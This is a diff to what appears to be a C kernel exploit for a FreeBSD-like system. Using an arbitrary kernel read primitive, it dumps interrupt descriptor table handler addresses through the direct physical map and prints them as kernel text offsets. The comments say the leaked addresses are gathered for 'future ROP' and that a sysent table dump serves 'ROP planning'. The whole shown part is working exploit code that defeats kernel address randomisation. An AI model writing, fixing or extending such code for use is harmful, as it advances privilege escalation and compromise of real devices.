@@ -2089,6 +2089,7 @@ ring3_fallback:
         printf("    kdata_base  = 0x%lx\n", (unsigned long)g_kdata_base);
         printf("    dmap_base   = 0x%lx\n", (unsigned long)g_dmap_base);
         printf("    CR3 (phys)  = 0x%lx\n", (unsigned long)g_cr3_phys);
+        fflush(stdout);
 
         /* 4d-3: IDT handler addresses (ktext reference points) */
         {
@@ -2098,28 +2099,50 @@ ring3_fallback:
             } __attribute__((packed)) idtr2;
             __asm__ volatile("sidt %0" : "=m"(idtr2));
 
+            printf("[*] IDTR: base=0x%lx, limit=0x%x\n",
+                   (unsigned long)idtr2.base, idtr2.limit);
+            fflush(stdout);
+
+            /* Verify IDT is readable before iterating */
+            uint64_t idt_pa = va_to_pa_quiet(idtr2.base);
+            printf("    IDT PA=0x%lx\n", (unsigned long)idt_pa);
+            fflush(stdout);
+
             struct {
                 uint16_t offset_lo; uint16_t selector;
                 uint8_t ist; uint8_t type_attr;
                 uint16_t offset_mid; uint32_t offset_hi; uint32_t reserved;
             } __attribute__((packed)) gate;
 
-            printf("[*] IDT handler addresses (ktext references for future ROP):\n");
-            static const struct { int vec; const char *name; } idt_vecs[] = {
-                {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
-                {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
-                {32, "Timer"}, {128, "int80"},
-            };
-            for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
-                int v = idt_vecs[i].vec;
-                kernel_copyout(idtr2.base + v * 16, &gate, 16);
-                uint64_t handler = (uint64_t)gate.offset_lo |
-                                   ((uint64_t)gate.offset_mid << 16) |
-                                   ((uint64_t)gate.offset_hi << 32);
-                printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx)\n",
-                       v, idt_vecs[i].name, (unsigned long)handler,
-                       (unsigned long)(handler - g_ktext_base));
+            /* Read IDT entries via DMAP to avoid kernel_copyout issues */
+            if (idt_pa != 0) {
+                printf("[*] IDT handler addresses (via DMAP):\n");
+                static const struct { int vec; const char *name; } idt_vecs[] = {
+                    {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
+                    {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
+                    {32, "Timer"}, {128, "int80"},
+                };
+                for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
+                    int v = idt_vecs[i].vec;
+                    /* Read gate via DMAP instead of kernel_copyout */
+                    uint64_t gate_pa = idt_pa + v * 16;
+                    int rc = kernel_copyout(g_dmap_base + gate_pa, &gate, 16);
+                    if (rc != 0) {
+                        printf("    IDT[%3d] %-6s — DMAP read failed\n",
+                               v, idt_vecs[i].name);
+                        continue;
+                    }
+                    uint64_t handler = (uint64_t)gate.offset_lo |
+                                       ((uint64_t)gate.offset_mid << 16) |
+                                       ((uint64_t)gate.offset_hi << 32);
+                    printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx)\n",
+                           v, idt_vecs[i].name, (unsigned long)handler,
+                           (unsigned long)(handler - g_ktext_base));
+                }
+            } else {
+                printf("[-] IDT page not mapped — skipping handler dump.\n");
             }
+            fflush(stdout);
         }
 
         /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
@@ -2131,6 +2154,7 @@ ring3_fallback:
              *   offset 4: int32_t pad    (4 bytes)
              *   offset 8: void *sy_call  (8 bytes) */
             printf("[*] Scanning kdata for sysent table...\n");
+            fflush(stdout);
 
             /* Read sysent[0] (nosys) through sysent[10] to find the table.
              * sysent[1] = sys_exit (1 arg), sysent[2] = sys_fork (0 args),
